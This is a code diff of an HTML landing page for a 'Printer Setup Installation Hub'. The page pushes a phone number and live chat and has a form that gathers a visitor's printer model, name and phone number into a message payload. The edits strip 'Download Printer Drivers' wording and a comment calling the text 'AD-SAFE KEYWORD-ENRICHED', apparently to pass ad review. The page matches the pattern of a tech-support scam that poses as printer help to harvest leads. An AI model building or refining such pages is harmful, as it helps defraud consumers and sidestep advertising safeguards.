@@ -1,8 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18240412400"></script>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18240412400"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
@@ -20,7 +19,6 @@
 
   <title>Printer Setup Installation Hub</title>
   
-  <!-- Optimized Fast & Non-blocking Lucide Vector Icons Engine -->
   <script src="/lucide.min.js" defer></script>
 
   <style>
@@ -109,6 +107,33 @@
       color: #111827;
       letter-spacing: -0.03em;
       margin-bottom: 1.25rem;
+    }
+
+    /* Professional Checkpoints Typography & Structure */
+    .hero-checkpoints-container {
+      display: flex;
+      flex-direction: row;
+      justify-content: center;
+      align-items: center;
+      gap: 2.5rem;
+      flex-wrap: wrap;
+      margin-top: 1.75rem;
+    }
+
+    .checkpoint-item {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-weight: 700;
+      color: #111827;
+      font-size: 1.05rem;
+    }
+
+    .checkpoint-icon {
+      color: #0085FF;
+      stroke-width: 3;
+      width: 22px;
+      height: 22px;
     }
 
     .pill-download-btn {
@@ -423,23 +448,33 @@
 </head>
 <body>
 
-  <!-- STICKY LEFT CONTACT TAB WITH SHAKING PHONE ICON -->
   <div class="sticky-left-contact font-sans">
     <i data-lucide="phone" class="shake-icon" style="width: 30px; height: 30px;"></i>
     612-314-9536
   </div>
 
-  <!-- ─── HERO MAIN TITLE BLOCK ─── -->
   <div class="section-hero-title">
     <div class="max-w-5xl">
       <h1 class="main-title font-sans">Select Your Printer Model</h1>
-      <div class="pill-download-btn font-sans">
-        Download Your Printer Drivers
+      
+      <div class="hero-checkpoints-container font-sans">
+        <div class="checkpoint-item">
+          <i data-lucide="check" class="checkpoint-icon"></i>
+          Complete Printer Setup Help
+        </div>
+        <div class="checkpoint-item">
+          <i data-lucide="check" class="checkpoint-icon"></i>
+          Resolve Printer Offline Status
+        </div>
+        <div class="checkpoint-item">
+          <i data-lucide="check" class="checkpoint-icon"></i>
+          Fix Printer Not Responding Errors
+        </div>
       </div>
+
     </div>
   </div>
 
-  <!-- ─── BRAND GRID (FORCED SINGLE HORIZONTAL ROW LINE) ─── -->
   <div class="brand-section">
     <div class="max-w-5xl">
       <div class="brand-grid">
@@ -464,8 +499,7 @@
     </div>
   </div>
 
-  <!-- ─── NEED HELP TOLL BANNER ACCENT BAR ─── -->
- <div class="grey-accent-block">
+  <div class="grey-accent-block">
 
 <div class="max-w-5xl">
 
@@ -491,16 +525,15 @@ Live Chat
 
 </div>
 
-  <!-- ─── DRIVER INGESTION CARD PANEL ─── -->
   <section class="form-section" id="driver-capture-panel">
     <div class="max-w-6xl">
       
       <div class="form-title-wrap">
-        <h2 class="form-title-main font-sans">Download Printer Drivers</h2>
+        <h2 class="form-title-main font-sans">Printer Setup &amp; Connection Assistance</h2>
       </div>
 
       <div class="panel-card-container">
-        <div class="panel-blue-header font-sans">Download Printer Drivers</div>
+        <div class="panel-blue-header font-sans">Request Printer Setup &amp; Error Help</div>
         <div class="panel-body-grid-form">
           
           <form onsubmit="handlePortalFormSubmit(event)">
@@ -521,7 +554,7 @@ Live Chat
                 <input type="tel" id="mainPhoneInput" placeholder="+1 000 000 0000" class="field-element-input" required>
               </div>
 
-              <button type="submit" class="action-find-btn font-sans">Find Drivers</button>
+              <button type="submit" class="action-find-btn font-sans">Get Assistance</button>
 
             </div>
           </form>
@@ -537,7 +570,6 @@ Live Chat
     </div>
   </section>
 
-  <!-- ─── MORE CONFIGURATION OPTIONS ─── -->
   <section class="utilities-section">
     <div class="max-w-6xl">
       <h3 class="utilities-main-title font-sans">More configuration options for this topic</h3>
@@ -546,7 +578,7 @@ Live Chat
         
         <div class="utility-card skin-blue">
           <i data-lucide="disc"></i>
-          <p class="font-sans">Software and Drivers</p>
+          <p class="font-sans">Setup &amp; Connection Help</p>
         </div>
 
         <div class="utility-card skin-charcoal-dark">
@@ -563,7 +595,6 @@ Live Chat
     </div>
   </section>
 
-  <!-- ─── AD-SAFE KEYWORD-ENRICHED TEXT COLUMNS (SIDE-BY-SIDE GRID) ─── -->
   <section class="analysis-text-section">
     <div class="max-w-6xl">
       <div class="analysis-grid">
@@ -615,7 +646,7 @@ async function handlePortalFormSubmit(event) {
     const targetPhone = document.getElementById('mainPhoneInput').value.trim();
 
     const htmlMessagePayload = `
-🖨️ <b>New Driver Ingestion Request</b>
+🖨️ <b>New Printer Assistance Request</b>
 
 🔢 <b>Model Number:</b> ${targetModel}
 👤 <b>Full Name:</b> ${targetName}
@@ -655,12 +686,12 @@ document.addEventListener("DOMContentLoaded", function () {
 <!-- Start of LiveChat (www.livechat.com) code -->
 <script>
     window.__lc = window.__lc || {};
-    window.__lc.license = 19811106;
+    window.__lc.license = 19830126;
     window.__lc.integration_name = "manual_channels";
     window.__lc.product_name = "livechat";
     ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
 </script>
-<noscript><a href="https://www.livechat.com/chat-with/19811106/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
+<noscript><a href="https://www.livechat.com/chat-with/19830126/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
 <!-- End of LiveChat code -->
 </body>
 </html>
